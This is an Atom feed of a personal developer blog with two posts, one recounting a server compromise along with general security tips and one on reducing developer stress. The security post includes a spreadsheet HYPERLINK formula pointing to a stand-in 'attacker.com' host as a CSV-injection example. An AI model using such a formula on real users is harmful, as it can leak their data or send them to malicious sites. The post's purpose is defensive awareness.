<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Adrian Mejia Blog</title>
  <subtitle>var life = [&#39;work_smart&#39;, &#39;have_fun&#39;, &#39;make_history&#39;];</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://adrianmejia.com/"/>
  <updated>2019-01-24T21:08:53.000Z</updated>
  <id>https://adrianmejia.com/</id>
  
  <author>
    <name>Adrian Mejia</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>I got Hacked and It changed my life</title>
    <link href="https://adrianmejia.com/blog/2019/01/24/I-got-hacked-and-It-changed-my-life-on-security-tips/"/>
    <id>https://adrianmejia.com/blog/2019/01/24/I-got-hacked-and-It-changed-my-life-on-security-tips/</id>
    <published>2019-01-24T21:08:53.000Z</published>
    <updated>2019-01-24T21:08:53.000Z</updated>
    
    <content type="html"><![CDATA[<p>I got hacked, and it changed my life‚Äôs <strong>perspective</strong> <strong>on security</strong>. Here‚Äôs a compilation of something that happened to me and some security tips to prevent it.</p>
<h1 id="Hack-incident">Hack incident<a href="#Hack-incident" class="headerlink" title="Hack incident"></a></h1><p>I‚Äôve been very chill about security most of my life. I‚Äôm 32, and I never got my social media hacked or emails. However, something that changed when I set up a personal server on the cloud and I got an intruder!</p>
<p>This server was collecting data from financial markets (just for fun and to play with some backtracking strategies). One day, I check the data as usual, and It was empty! I was in shock! What happened!? üëÄ</p>
<p>I reviewed the authentication logs and found out thousands of attempts to log in to my server! ü§Ø I saw attempts from everywhere: France, Rusia, Canada, Germany, China, and other countries! Fortunately, none of this got in. However, I still got hacked, how? ü§î</p>
<p>It turns out that when I set up the database, I didn‚Äôt bother to change the default configuration. It wouldn‚Äôt do that for work but since it was a personal project and the data was public anyway, so I didn‚Äôt care too much. I also thought ‚ÄúMeh, nobody is going to find it. I don‚Äôt have this IP published anywhere‚Äù. However, I was wrong. People/bots did find it and tons of them!</p>
<p>So I learned the following. There are people/organizations which scan every possible IP address. It doesn‚Äôt matter if it is listed anywhere or not. Hackers/bots will scan any known port on every IP address and hope people leave defaults open.</p>
<p>Hackers will try to log in into your server and try very common usernames (<code>pi</code>, <code>linode</code>, <code>root</code>, <code>admin</code>, etc.) and default passwords. They also attempt to connect to any possible database on their default ports. This not being paranoid, I was able to see all the attempts from the logs.</p>
<p>I‚Äôm glad they drop my database, so I noticed what happened. Hackers could keep login to my server for years, and I probably wouldn‚Äôt notice for a long time. That might be happening right now. Many companies have their servers compromised, and they don‚Äôt even know it. When they realized it, it‚Äôs already late, and then you see the news about it.</p>
<p>Some examples of data breaches:</p>
<ul>
<li>In 2013, <strong>Yahoo</strong> 3 billion users and <strong>Target</strong> with 110 credit cards.</li>
<li>In 2014, <strong>Marriott</strong> with 500 million guests and <strong>eBay</strong> with 145 million users.</li>
<li>In 2017, <strong>Equifax</strong> with 143 million social security numbers, addresses, and birth dates.</li>
<li>Even banks get hacked like the JP Morgan <strong>Chase</strong> on 2014 with 76 million households and 7 million businesses.</li>
<li>Not even security companies are exempt like <strong>RSA Security</strong> in 2011 with 40 million employee records stolen.</li>
</ul>
<p>As you can see, the cybercriminals are real, and everything that you have connected to the Internet is their target. No company or person can 100% prevent being hacked. However, you can make it way more difficult and reduce the chances to 1 in 1000 years, which is pretty good.</p>
<p>For instance, just your password length and special character alone can tell how long would take to break it:</p>
<ul>
<li>If your password is <code>Password</code> takes around 0.29 seconds to break.</li>
<li>If your password is <code>P@ssw0rd</code> takes around 14 years.</li>
<li>If your password has 12 characters <code>abcdefghijkl</code> it takes 200 years to generate it.</li>
<li>This password <code>P@ssw0rd123456!!</code> would take more than hundreds of thousand years to hack.</li>
</ul>
<h1 id="Security-Tips">Security Tips<a href="#Security-Tips" class="headerlink" title="Security Tips"></a></h1><p>Here are my 67 security tips on bullet points.</p>
<h2 id="Generic-tips">Generic tips<a href="#Generic-tips" class="headerlink" title="Generic tips"></a></h2><ul>
<li>Use different passwords for everything. If you use the same password for everything some website gets compromised (e.g., Amazon), then everything that has the same user and password will be at risk. I know it‚Äôs a hassle to remember all, but you don‚Äôt have to. Use a password manager like Bitwarden, 1Password, LastPass, Dashlane or even Google Chrome built-in password manager.</li>
<li>Use long passwords with special characters. If you are using a password manager, you can ask to auto-generate a secure password.</li>
<li>Use <strong> 2-factor authentication</strong> whenever is available.</li>
<li>Enable all security features on the services that you use.</li>
<li>Everything that runs arbitrary code on your computer should not be trusted.</li>
<li>Don‚Äôt trust defaults blindly verify if there‚Äôs a more secure option.</li>
<li>Keep all your devices, operating systems and dependencies up-to-date. Most well-known vulnerabilities are fixed shortly after they are reported.</li>
</ul>
<h2 id="Email-security-tips">Email security tips<a href="#Email-security-tips" class="headerlink" title="Email security tips"></a></h2><ul>
<li>Have <strong> 2-factor authentication</strong> on your emails. If someone gets access to your primary email, then they can use <code>forgot password</code> on many sites (Evernote, Bank Accounts) and change the password. I heard of somebody that got their email compromised, in turn, the hacker got access to their Evernote and found some passwords to their cryptocurrency exchanges and got robbed big time. Don‚Äôt be that guy. Enable 2FA.</li>
<li>Be aware of phishing emails. No, Bill Gates won‚Äôt share his fortune and donate you a million, nor you won any lottery. Don‚Äôt trust any email saying that you won money or any price. Also, be aware of fake company emails asking for you to log in somewhere. The site might look very similar, but it‚Äôs a trap! They want to capture your password. Check the domain carefully or even better yet don‚Äôt click on any link from the email and type your company web address directly as you usually do.</li>
<li>Be aware of malicious attachments. Specially executables (<em>.exe, </em>.bat, <em>.sh, </em>.zip). See also Microsoft documents part. Everything that can run arbitrary code on your computer should not be trusted.</li>
</ul>
<h2 id="Social-Media">Social Media<a href="#Social-Media" class="headerlink" title="Social Media"></a></h2><ul>
<li>Enable all the security options they have like 2 Factor authentication, SMS confirmation.</li>
</ul>
<h2 id="Microsoft-Documents">Microsoft Documents<a href="#Microsoft-Documents" class="headerlink" title="Microsoft Documents"></a></h2><ul>
<li>If you use your documents locally or by trusted peers, you shouldn‚Äôt have many problems. However, for auto-generated documents like (*.csv) that you download from emails or compromised websites they can change data or insert malicious links (<code>=HYPERLINK(&quot;[http://attacker.com?some=&#39;data](http://attacker.com/?some=%27data%27)&#39;)</code>) and take you to their websites.</li>
<li>Be aware of macros. They are code that automatically runs when you open the program. In modern versions, Office alerts you when a doc has a macro, and now they are disabled by default.</li>
</ul>
<h2 id="Wifi-security-tips">Wifi security tips<a href="#Wifi-security-tips" class="headerlink" title="Wifi security tips"></a></h2><ul>
<li>Use a password for your wifi. If you leave it open anybody connects to it can have access to your computers, cell phones, tablets, and smart fridge or cameras.</li>
<li>Use strong encryption for Wifi. Don‚Äôt use WEP encryption. Use  WPA or the newer WPA2. WEP can be cracked relatively quickly using some programs.</li>
<li>Use a strong password. It makes it harder to break.</li>
<li>Provide a separate network for guests, so your connected devices are not exposed nor your router.</li>
<li>If you use public wifi, consider using a VPN. Hotspot operators and ISPs can snoop into your traffic, but if you use a VPN, they won‚Äôt be able to.</li>
<li>If you are very paranoid or are working with something top secret. Here are some advanced options:<ul>
<li>Have a hidden Wi-fi (SSID) and don‚Äôt broadcast it. You will need the name to connect to it.</li>
<li>Restrict access by MAC address list. This list will allow only the devices in there to connect to the network.</li>
<li>Shutdown your network when is not in used. It‚Äôs a little extreme, but that‚Äôs the ultimate security measure or use wired connections.</li>
</ul>
</li>
</ul>
<h2 id="Developers-security-tips">Developers security tips<a href="#Developers-security-tips" class="headerlink" title="Developers security tips"></a></h2><ul>
<li>Keep all your operating systems and dependencies up-to-date. As vulnerabilities are reported, they are fixed in newer versions.</li>
<li>Use latest encryption protocols TLS (rather than older SSL versions)<ul>
<li>Use SFTP instead of FTP</li>
<li>Use SSH instead of telnet</li>
<li>Use HTTPS instead of HTTP. You can encrypt for free with <a href="https://letsencrypt.org/" target="_blank" rel="noopener">Let‚Äôs Encrypt</a>.</li>
</ul>
</li>
<li>Disable direct root login in SSH. You can escalate if needed using <code>sudo</code>.</li>
<li>Disable SSH connection with passwords. Use ssh private key to log in instead.</li>
<li>Use firewalls to block any port that you are not using. Firewalls minimize the surface of attack. For Linux, you can use <code>UFW</code>; other option is <code>iptables</code>.</li>
<li>Use VPN and private networks. If you don‚Äôt need to expose a database to the internet, even better. Make it only accessible for your private network or VPN.</li>
<li>Don‚Äôt trust default configuration of programs facing the internet. Change default ports on databases, ssh.<ul>
<li>Instead of logging <code>ssh</code> on port <code>22</code>. Use port <code>2146</code> for instance. I did this and noticed how the attempts of login went from hundreds to zero.</li>
<li>Instead of running MongoDB on port <code>27017</code>, use <code>56073</code></li>
</ul>
</li>
<li>Change default user/passwords. Remove default users (e.g., RaspberryPi comes with the <code>pi</code> user that allow people to login into it, change it!)</li>
<li>Enable authorization on your databases (use passwords). Don‚Äôt leave them wide open to the world (and hackers).</li>
<li>Remove default accounts in your databases. E.g., MySQL</li>
<li>Keep backups (nightly?)</li>
<li>Automate monitoring and alert reports. Nobody has time to be glued to logs every time. However, you should set alerts when certain events happen.<ul>
<li>Alerts for failed attempts of login<ul>
<li><code>zcat /var/log/auth.log.*.gz | grep &#39;sshd&#39; | grep &#39;exceeded\|Invalid&#39; | cut -d: -f4- | sort | uniq -c | sort -rn</code></li>
</ul>
</li>
<li>Monitor your database logs for anomalies, such as dropping database commands.</li>
</ul>
</li>
<li>Be aware of package managers. To name a few Node‚Äôs NPM, Ruby Gems and Mac‚Äôs <a href="http://brew.sh" target="_blank" rel="noopener">brew.sh</a>. If someone gets access to the administrator password of popular packages you might be at risk.<ul>
<li>NPM has scripts that can run arbitrary code when something is installed: <a href="https://docs.npmjs.com/misc/scripts#examples" target="_blank" rel="noopener">postinstall</a>. Similarly,  Ruby Gems ha a <code>post_install</code> hook. This script has access to your whole file system, ssh keys and nothing prevent them from sending them to a remote server.</li>
<li>Brew adds binaries on your <code>/usr/local</code> and modifies the <code>PATH</code>, so this location has the preference. That change could make malicious programs run before the original program.</li>
</ul>
</li>
<li>Finally, never trust anything that comes from the user/internet.  If you are running a web form, sanitize the inputs (strip out malicious scripts).</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;I got hacked, and it changed my life‚Äôs &lt;strong&gt;perspective&lt;/strong&gt; &lt;strong&gt;on security&lt;/strong&gt;. Here‚Äôs a compilation of something that 
    
    </summary>
    
      <category term="Miscellaneous" scheme="https://adrianmejia.com/categories/Miscellaneous/"/>
    
    
      <category term="security" scheme="https://adrianmejia.com/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>How can developers reduce stress</title>
    <link href="https://adrianmejia.com/blog/2019/01/03/How-can-developers-reduce-stress/"/>
    <id>https://adrianmejia.com/blog/2019/01/03/How-can-developers-reduce-stress/</id>
    <published>2019-01-04T00:28:50.000Z</published>
    <updated>2019-01-04T14:31:00.000Z</updated>
    
    <content type="html"><![CDATA[<!-- draft date: 2018-12-19 16:20:36 -->
<p>Most professions nowadays involve a certain degree of stress. We have deadlines, change of requirements at the last minute and to deal with people. On top of that, when you work in front of a computer 8+ hours additional stressors are added. Your eyes might get dry. Also the lack of movement might cause you back/neck pain, while your muscles shrink and your belly expands. This post will give you some tips to accomplish your goals without sacrificing your health. I also included some bonus tips for software engineers.</p>
<a id="more"></a>
<h1 id="Background">Background<a href="#Background" class="headerlink" title="Background"></a></h1><p>There was a time in my life, back in 2015, where I went through severe stress crisis. I was juggling too many things at once: writing a book, interviewing in the USA for new jobs, and getting a work visa, and planning a wedding while keeping up with a full-time job and also the sole programmer on two startups. It was the busiest time of my life, and my health suffered a lot! I dreamt about source code. Some nights I couldn‚Äôt sleep, so I worked instead. I went to the ER multiple times with heart palpitations. I knew I could not keep living in that way. I‚Äôve been experimenting with what helps and what not. This post is a compilation of the ones that helped.</p>
<h1 id="Ideas-to-handle-stress">Ideas to handle stress<a href="#Ideas-to-handle-stress" class="headerlink" title="Ideas to handle stress"></a></h1><p>I‚Äôve been incorporating the following techniques and it had helped me a lot to cope with stress! Hope they can help you, too!</p>
<h2 id="Move-üö∂‚Äç‚ôÇÔ∏è">Move üö∂‚Äç‚ôÇÔ∏è<a href="#Move-üö∂‚Äç‚ôÇÔ∏è" class="headerlink" title="Move üö∂‚Äç‚ôÇÔ∏è"></a></h2><p>Have you noticed that after a long time sitting your energy levels and concentration start to drop?</p>
<p>Taking a break to get some movements is great way to solve this issue!</p>
<blockquote>
<p>Movement =&gt; Energy</p>
</blockquote>
<p><strong>Take a 5 minutes break after 25 minutes of work</strong>. You can also do 50/10 minutes of work/break. What matters is that you get some rest to move around and take a deep breath.</p>
<p>The 25/5 minutes of work/break is also known as the Pomodoro technique. There are many apps that I have used to remind me to take a break. As simple as it sounds, it‚Äôs easy to get carried away when working on a computer and lose the notion of time.</p>
<p><strong>Note</strong>: sitting for long time doesn‚Äôt get automatically fixed with working out after work. You still have to try walking around at least every hour so your body don‚Äôt suffer.</p>
<details>
  <summary>Apps I‚Äôve used‚Ä¶</summary>

<br>

<b>MacOs</b>

<ul>
  <li>
    <b><a href="https://geo.itunes.apple.com/us/app/recess/id621451282?mt=12&app=apps" target="_blank" rel="noopener">Recess</a></b> this one of my favorite because it‚Äôs the simplest and blackout the screen. It keep some <a href="https://i.imgur.com/WZfeTLy.png" target="_blank" rel="noopener">stats</a>
  </li>
  <li>
    <b><a href="https://geo.itunes.apple.com/us/app/be-focused-pro-focus-timer/id961632517?mt=12&app=apps" target="_blank" rel="noopener">Be Focused - Timer</a></b> similar to <code>Recess</code> but also has a list where you can keep track of the time spend on each one.
  </li>
</ul>

<br>

<b>iOS</b>

<ul>
  <li>
    <b><a href="https://itunes.apple.com/us/app/forest-stay-focused/id866450515?mt=8" target="_blank" rel="noopener">Forest</a></b> This has a timer and some background music that could help you concentrate.
  </li>
</ul>

<p>I don‚Äôt use Android/Windows very often, so if you have suggestions write it down in the comments.</p>

<hr>
</details>

<!--
https://cdn-images-1.medium.com/max/2000/1*iRmZDugBpvyLVlzC1DXSiA.png.
-->
<p>Taking breaks can also reduce eye strain. I suffer from dry eyes from time to time. When we stare at a digital screen, we don‚Äôt blink as often causing our eyes dryness.  There‚Äôs also a rule of thumb 20-20-20. It means that, every 20 minutes, you look at something of 20 feet away for 20 seconds.
At one point I also notice that my eyesight was getting worse, so I also incorporated some eyes exercises during the break. That also helped with the dryness a lot!</p>
<details>
  <summary>Eye exercises I‚Äôve tried‚Ä¶</summary>

  <ul>
    <li>Blinking rapidly around 20 times. It helps with the dryness.</li>
    <li>Extending my thumb as far and close to my eyes as I can.</li>
    <li>Doing circles with thumbs while my eyes follow them. You can also look up and down, and right to left.</li>
  </ul>
<hr>
</details>

<h2 id="Brainstorm-üß†">Brainstorm üß†<a href="#Brainstorm-üß†" class="headerlink" title="Brainstorm üß†"></a></h2><p>Have you felt stressed when you get stuck on something for a while? Well, it‚Äôs time to take a step back and put things in perspective. There might be a straighter line to get to your goal. <strong>List all the alternatives</strong> you can think of (don‚Äôt label them as ‚Äúgood‚Äù or ‚Äúbad‚Äù. Put it all down ‚Äúsmart‚Äù ideas and especially the ‚Äúdumb‚Äù ones). Choose the ones that you think will work the best. Work smarter, not harder!</p>
<p>If you are going to cut a tree is important to sharpen your ax first and then get to it. Not just will you cut the tree faster but also with less effort. Likewise, it‚Äôs vital that you take some time to do a little planning before jumping right into the task in hand. Beware of not overdoing it, set a time limit for this exercise. If you spend all the time sharpening the ax and never cut the tree is not good either ;)</p>
<h2 id="Subtask-‚úåÔ∏è">Subtask ‚úåÔ∏è<a href="#Subtask-‚úåÔ∏è" class="headerlink" title="Subtask ‚úåÔ∏è"></a></h2><p><strong>Divide a big task into smaller ones</strong>. Completing some small tasks will motivate you to get more done. Also keeps the stress away since you feel you are making progress.</p>
<p>Even the most ambitious projects and tallest buildings started with laying down one brick/block. Likewise, no matter how big your project is, when you break it down into smaller pieces, it makes it easier to reason about.</p>
<p>Tackling a small task is less daunting to deal with the project as a whole, so you will be less likely to procrastinate and stress about it.</p>
<h2 id="Prioritize-üéØ">Prioritize üéØ<a href="#Prioritize-üéØ" class="headerlink" title="Prioritize üéØ"></a></h2><p>Most of us have an endless TO DO list where things get added a lot faster than we can check them off. An infinite list of things to do stress us big time. What if I tell you, that in most cases you only need to <strong>complete the 20%</strong> of list to reap 80% of the benefits? üò≤</p>
<p>If you can‚Äôt do it all, then prioritize. Do what matters the most upfront. The 20% of the task might account for 80% of the result (Pareto Principle). Find that critical 20% and execute on that first. For the rest of the list, you can apply the 80/20 principle recursively. Find the next 20% that matters the most and for the rest apply Pareto again, delegate or re-evaluate if is still needed.</p>
<h2 id="Ask-üó£">Ask üó£<a href="#Ask-üó£" class="headerlink" title="Ask üó£"></a></h2><p>If you have more on your plate more than you can chew, then share with others. Don‚Äôt choke alone. <strong>Ask for help</strong>.</p>
<p>When you request for help, the other person usually feels good. You are creating a bond and companionship with that person. However, don‚Äôt overdo it! Otherwise, it will have the opposite effect. Before asking for help, you should do your homework. Try to solve it yourself first, google it and struggle with the issue a little while. Write down some questions and where you got stuck (exact error messages, etc.) The other person will appreciate that you are respecting their time and that you are asking detailed questions.</p>
<p><br></p>
<p><hr>
When we neglect our body the proper care we also can become sick which will take productivity to the floor. The following tips will help our body to cope with stress and keep the health.</p>
<hr>

<h2 id="Drink-üö∞">Drink üö∞<a href="#Drink-üö∞" class="headerlink" title="Drink üö∞"></a></h2><p>Stay hydrated. <strong>Your brain is mostly water so don‚Äôt let it dry</strong>. A good rule of thumb is to drink half of your weight in ounces (e.g., 170lb -&gt; 85 oz. water).</p>
<p>Your body is a fantastic machine that tries to keep the balance regardless of what we throw at it. It remains a certain temperature when it‚Äôs freezing by shivering or sweating when it‚Äôs hot. It seeks to maintain the pH of your blood even if you drink too many acidic beverages (sodas, coffee). It tries to keeps your blood sugar on check even after eating a donut or if haven eaten in hours. However, our bodies need the proper nutrients and water to do so. When you don‚Äôt hydrate yourself enough, it can‚Äôt remove the waste out of your system. So, drink up!</p>
<p>Another way to know if you are hydrated is monitoring how often your pee (crazy, right?). If you haven‚Äôt pee in 3 hours, you need two glasses of water ASAP.</p>
<details>
  <summary>Apps I‚Äôve used‚Ä¶</summary>

<br>
<b>iOS</b>
<ul>
  <li>
    <a href="https://itunes.apple.com/us/app/waterminder/id653031147?mt=8" target="_blank" rel="noopener">WaterMinder</a> You can track the amount of water that you drink and have reminders.
  </li>
  <li>
    <a href="https://itunes.apple.com/us/app/pee-see-water-reminder/id1090749982?mt=8" target="_blank" rel="noopener">Pee &amp; See: Water Reminder</a> Alternative method of measuring hydration. Instead of logging the amout of water drank you log how often you pee. If you haven‚Äôt pee in 3+ hours you will get a reminder to drink more water.
  </li>
</ul>

<p>I don‚Äôt use Android very often, so if you have suggestions write it down in the comments.</p>

<hr>
</details>

<h2 id="Nourish-ü•¶">Nourish ü•¶<a href="#Nourish-ü•¶" class="headerlink" title="Nourish ü•¶"></a></h2><p>How productive are you when you are sick? Exactly! You get almost nothing done. On top of that, your stress increases and the deadlines get closer. A well-nourish body gets sick less and has more energy. You would be more productive!</p>
<p>Supplement yourself with <strong>vitamin C</strong> &amp; fruits.  Vitamin C helps your body to quickly clear out Cortisol, which is a hormone correlated to stress. It also keeps your immune system healthy. <strong>Magnesium</strong> from leafy greens helps to relax the muscles among many other benefits.</p>
<details>
  <summary>Foods to eat more regularly‚Ä¶</summary>

<ul>
<li>Nuts</li>
<li>Fish</li>
<li>Vegetable of different colors</li>
<li>Leafy greens</li>
<li>Fruits</li>
</ul>

<hr>
</details>

<h2 id="Stretch-üôÜ‚Äç‚ôÄÔ∏è">Stretch üôÜ‚Äç‚ôÄÔ∏è<a href="#Stretch-üôÜ‚Äç‚ôÄÔ∏è" class="headerlink" title="Stretch üôÜ‚Äç‚ôÄÔ∏è"></a></h2><p>Prolonged sitting is the new smoke. It might increase your body weight, back, and neck pain. Even if you exercise an hour before/after work, still you are hurting yourself for sitting too long at once. You have to break sitting often.</p>
<p>As discussed before, try to break sitting every 25 minutes or an hour with some stretching session. Our bodies are not designed to stay 8 hours per day sitting still. It was designed to move. Indeed, great ideas happen when you are on the move (showering/walking). If you are stuck with some task, take a little walk, stretch out and might give you some perspective.</p>
<h2 id="Workout-üèãÔ∏è‚Äç‚ôÄÔ∏è">Workout üèãÔ∏è‚Äç‚ôÄÔ∏è<a href="#Workout-üèãÔ∏è‚Äç‚ôÄÔ∏è" class="headerlink" title="Workout üèãÔ∏è‚Äç‚ôÄÔ∏è"></a></h2><p>Move your butt often, get some sweat in your forehead. Working out releases endorphins that increase your sense of well-being.</p>
<p>Working out your muscles can help you release tension and reduce your mental stress. However, don‚Äôt overdo it or it can backfire you. Try to avoid getting injured by doing small progressive changes rather than going too big the first day and then not being able to walk nor shower.</p>
<details>
  <summary>Apps I‚Äôve used‚Ä¶</summary>

<br>

<b>iOS</b>

<ul>
  <li>
    <b>
    <a href="https://itunes.apple.com/us/app/stronglifts-5x5-weight-lifting/id488580022?mt=8" target="_blank" rel="noopener">Stronglifts 5x5 Weight Lifting</a></b> I have used this program for 6 months and I have seen very good results. It‚Äôs simple and have a nice tracker and videos how to do each exercise.
  </li>
</ul>

<hr>
</details>

<h2 id="Breath-üí®">Breath üí®<a href="#Breath-üí®" class="headerlink" title="Breath üí®"></a></h2><p>If you are reading this, it means you are breathing (of course!). However, not all breaths are equal!  üëÄ</p>
<p>Take some very deep and slow breaths from time to time. When we are stressed out, we breathe very fast and shallow.</p>
<p>Proper breathing is vital for relaxation. You can avoid/overcome panic attacks. Just sitting relaxed and being aware of your breath when the air goes in and out can cool off your mind, reduce your heartbeats and blood pressure.</p>
<p>Some devices can track when you are tense, focus or calm. Guess how they do it? That‚Äôs right with your breathing.
I have use Spire. I think it‚Äôs useful to know track receive feedback when I was getting tense and try to take some deep breadth right there.</p>
<details>
  <summary>Devices I‚Äôve used‚Ä¶</summary>

<br>

  <b>
    <a href="https://amzn.to/2RxFBFi" target="_blank" rel="noopener">Spire Stone: Stress Management</a>
  </b>
  <br>
  <a target="_blank" href="https://www.amazon.com/gp/product/B00TH3SQOI/ref=as_li_tl?ie=UTF8&camp=1789&creative=9325&creativeASIN=B00TH3SQOI&linkCode=as2&tag=adrian0ea-20&linkId=af991d73cb812919c0e03644226f41e8"><img border="0" src="//ws-na.amazon-adsystem.com/widgets/q?_encoding=UTF8&MarketPlace=US&ASIN=B00TH3SQOI&ServiceVersion=20070822&ID=AsinImage&WS=1&Format=_SL250_&tag=adrian0ea-20"></a><img src="//ir-na.amazon-adsystem.com/e/ir?t=adrian0ea-20&l=am2&o=1&a=B00TH3SQOI" width="1" height="1" border="0" alt="" style="border:none !important; margin:0px !important;">

  This one you wear it on your belt or bra. It will capture your breathing. I easily forget to wear it or I lose it. However I learn a couple of thinks wearing the device:
  <ul>
    <li>How is my breathing per minute when I‚Äôm stress/calm/focus. <a href="https://i.imgur.com/GjYPPpm.png" target="_blank" rel="noopener">bpm</a></li>
    <li>What activities stress me out <a href="https://i.imgur.com/O71NzJb.png" target="_blank" rel="noopener">Location and time when stress</a></li>
  </ul>

<hr>
</details>

<h2 id="Meditate-üßò‚Äç‚ôÄÔ∏è">Meditate üßò‚Äç‚ôÄÔ∏è<a href="#Meditate-üßò‚Äç‚ôÄÔ∏è" class="headerlink" title="Meditate üßò‚Äç‚ôÄÔ∏è"></a></h2><p>Meditation is trending but still sounds a little strange for some people. It‚Äôs not about doing the lotus position. Simply put, meditation is focusing on the ‚Äúnow‚Äù because most of the time we get carried away fearing ‚Äúfuture‚Äù situations that might never happen or worrying about a ‚Äúpast‚Äù that we can‚Äôt change. All we got is ‚Äúnow‚Äù.</p>
<p>One of the best ways to be present is <strong>being aware of your breathing</strong>. It‚Äôs always in the present. So, the basis of meditation is mindful of your breath, and that alone can be calming.</p>
<details>
  <summary>Apps I‚Äôve used‚Ä¶</summary>

<br>

<p>There are many apps that you can use for helping you pick up the habit of being present and relax:</p>

<br>

<b>iOS</b>

<ul>
  <li>
    <b>
      <a href="https://itunes.apple.com/us/app/breethe-sleep-meditation/id920161006?mt=8" target="_blank" rel="noopener">Breethe: Sleep &amp; Meditation</a>
    </b>
    This app has a nice series of guides for beginners. It has a lot of different topics like sleeping, concentration.
  </li>


  <li>
    <b>
      <a href="https://itunes.apple.com/us/app/simple-habit-meditation/id1093360165?mt=8" target="_blank" rel="noopener">Simple Habit - Meditation</a>
    </b>
    It has a lot of different topics and also many instructors. Having different voices makes more dynamic.
  </li>

  <li>
    <b>
      <a href="https://itunes.apple.com/us/app/calm/id571800810?mt=8" target="_blank" rel="noopener">Calm</a>
    </b>
    It‚Äôs has a lot of free meditations and ambient music.
  </li>

  <li>
    <b>
      <a href="https://itunes.apple.com/us/app/headspace-meditation/id493145008?mt=8" target="_blank" rel="noopener">Headspace: Meditation</a>
    </b>
    It has only one instructor you  might get bored listening to the same person.
  </li>
</ul>

<p> I‚Äôm sure there are many other apps for this but this is the ones I‚Äôve used, and they are in my order of preference. </p>

<hr>
</details>



<h2 id="Play-üéÆ">Play üéÆ<a href="#Play-üéÆ" class="headerlink" title="Play üéÆ"></a></h2><p>After a long session of work, what‚Äôs your reward? If you go home to continue working and or doing mentally taxing activities, then you will burn out quickly!</p>
<p>If you don‚Äôt rest properly, the next day your focus will be all over the place. Also, the urge to procrastinate will be strong in you. Your mind will be looking for any chance to get a break.</p>
<p>Solution? Have some <strong>planned</strong> downtime! After some time of work well done, reward yourself with something that you enjoy. Playtime! Do something that put a smile on your face üòä.  Do something that makes you laugh ü§£.</p>
<blockquote>
<p>Life can‚Äôt be all broccoli and not desert.</p>
</blockquote>
<p>Have some fun and plan for it!</p>
<h2 id="Write-‚úçÔ∏è">Write ‚úçÔ∏è<a href="#Write-‚úçÔ∏è" class="headerlink" title="Write ‚úçÔ∏è"></a></h2><p>Journaling is one thing that helped me the most to calm my racing mind before going to sleep.</p>
<p>Use journals to write down thoughts, worries, plans, and let your mind run wild. Also, it helps a lot to write down things you are grateful on that day. It would make you feel better when you see written down some things turn out great on that day!  Even in the worse days, there are a few things that you can be thankful for.</p>
<p>Like brainstorming doesn‚Äôt label your writing as bad or good. Just let it flow and write down what‚Äôs on your mind.</p>
<p>Some people do it in the morning like Tim Ferris, I have seen a lot of benefits doing it at night. Find the time that works the best for you.</p>
<!--
Tim Ferris - https://tim.blog/2015/01/15/morning-pages/
http://www.gurl.com/2016/09/08/tips-on-how-to-make-the-most-perfect-bullet-journal-ideas
-->
<details>
  <summary>Tools I‚Äôve used‚Ä¶</summary>

  <ul>
    <li>
      <b>
        <a href="https://amzn.to/2RxM3w0" target="_blank" rel="noopener">Rocketbook Everlast Reusable Smart Notebook</a>
      </b>
      This nice to avoid getting distracted with phone/table notifications and being able to save your notes digitally (evernote/email).
      <a target="_blank" href="https://www.amazon.com/gp/product/B06ZXWVZ3X/ref=as_li_tl?ie=UTF8&camp=1789&creative=9325&creativeASIN=B06ZXWVZ3X&linkCode=as2&tag=adrian0ea-20&linkId=b0e7cd8801dc03ea32af135c8222b701"><img border="0" src="//ws-na.amazon-adsystem.com/widgets/q?_encoding=UTF8&MarketPlace=US&ASIN=B06ZXWVZ3X&ServiceVersion=20070822&ID=AsinImage&WS=1&Format=_SL250_&tag=adrian0ea-20"></a><img src="//ir-na.amazon-adsystem.com/e/ir?t=adrian0ea-20&l=am2&o=1&a=B06ZXWVZ3X" width="1" height="1" border="0" alt="" style="border:none !important; margin:0px !important;">
    </li>

    <li>
      <b>
        <a href="https://itunes.apple.com/us/app/rocketbook-app/id1036898971?mt=8" target="_blank" rel="noopener">Rocketbook App</a>
      </b>
      This app allow to convert your handwriting into scanned images.
    </li>
  </ul>

<hr>
</details>

<h2 id="Sleep-üò¥">Sleep üò¥<a href="#Sleep-üò¥" class="headerlink" title="Sleep üò¥"></a></h2><p>I neglected this one for some time. The truth is that we sometimes we think if we sleep less we would have more time to get stuff done. However, that‚Äôs not usually true. Your productivity/creativity decreases so much. If you are well-rested, you can solve problems in much less time.</p>
<p>The science of what happens while we sleep is still ongoing and fascinating. We know that memory consolidation happens while you sleep, your body repair itself, waste is removed from the brain. Your heart rate drops around 20%, and your stress hormones go down. Your nervous systems heal making you more responsive and sharp after a good night sleep.</p>
<p>Also, we have an idea of what happens when we don‚Äôt sleep much for a couple of days. We have problems concentrating. The quality of our work decreases and or creativity suffers. You might have headaches, darker shades under your eyes among other things.</p>
<p>Do you know having a good night sleep start during the day? For most people, it‚Äôs hard to sleep well (or at all) after a very stressful day or some big event coming up. That‚Äôs why doing breathing exercises through the day helps. Also, taking breaks every 25 or 50 minutes of work. Journaling helps me a lot to calm down my monkey mind jumping all over the place at night.</p>
<details>
  <summary>Apps I‚Äôve used‚Ä¶</summary>


<br>

  <b>iOS</b>

  <ul>
    <li>
      <b>
        <a href="https://itunes.apple.com/us/app/autosleep-tracker-for-watch/id1164801111?mt=8" target="_blank" rel="noopener">AutoSleep Tracker for Watch</a>
      </b>
      Keeps track of your sleep automatically. I used with the Apple Watch and works pretty well so far.
    </li>
  </ul>

<hr>
</details>

<p><br></p>
<p><hr>
An Additional bonus for Software Developers</p>
<hr>

<h1 id="Stress-management-for-Software-Developers">Stress management for Software Developers<a href="#Stress-management-for-Software-Developers" class="headerlink" title="Stress management for Software Developers"></a></h1><p>All the recommendations above could apply to anyone working at an office. In this section, we are going to give some more for people working with technology that changes very fast (like Software Developers).</p>
<h2 id="Information-overload-ü§Ø">Information overload ü§Ø<a href="#Information-overload-ü§Ø" class="headerlink" title="Information overload ü§Ø"></a></h2><p>Innovation in tech is happening at unprecedented pace and it will keep accelerating. Try to focus on the foundations and principles very well, since they are not changing anytime soon. Don‚Äôt feel like to have to learn everything new that comes out.</p>
